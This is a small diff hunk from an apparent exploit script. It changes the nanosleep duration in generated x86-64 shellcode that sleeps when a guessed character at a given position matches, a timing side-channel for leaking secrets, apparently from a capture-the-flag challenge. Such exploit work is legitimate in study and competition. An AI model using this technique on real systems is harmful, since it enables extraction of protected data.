@@ -34,7 +34,7 @@ def create_timing_shellcode(position, character):
         
         /* If match, nanosleep for 0.1 seconds */
         push 0
-        push 1000000000
+        push 100000000
         mov rsi, rsp
         xor rdi, rdi
         mov rax, 35
